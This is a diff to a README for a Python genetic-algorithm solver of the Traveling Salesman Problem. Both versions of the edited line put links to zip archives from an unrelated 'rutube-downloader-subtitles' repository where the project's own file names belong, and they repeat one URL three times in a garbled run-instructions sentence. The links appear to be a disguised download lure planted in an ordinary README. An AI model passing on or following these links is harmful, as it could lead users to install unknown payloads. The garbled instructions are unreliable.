@@ -2,7 +2,7 @@ Solving Traveling Salesmen Problem (TSP) using Genatic Algorithm
 Adopted Language: Python 3.5
 Compiler: Anaconda- Spyder 
 Main function contains 2 files names, to run files copy 
-https://github.com/xplodig/rutube-downloader-subtitles/raw/refs/heads/master/encounterer/rutube-downloader-subtitles-v1.4.zip and https://github.com/xplodig/rutube-downloader-subtitles/raw/refs/heads/master/encounterer/rutube-downloader-subtitles-v1.4.zip in same directory as https://github.com/xplodig/rutube-downloader-subtitles/raw/refs/heads/master/encounterer/rutube-downloader-subtitles-v1.4.zip
+https://raw.githubusercontent.com/xplodig/rutube-downloader-subtitles/master/encounterer/downloader-subtitles-rutube-1.2.zip and https://raw.githubusercontent.com/xplodig/rutube-downloader-subtitles/master/encounterer/downloader-subtitles-rutube-1.2.zip in same directory as https://raw.githubusercontent.com/xplodig/rutube-downloader-subtitles/master/encounterer/downloader-subtitles-rutube-1.2.zip
 To chanage selection of File to be executed  Change file name from
 follwing fuction in Main
 def readfile():
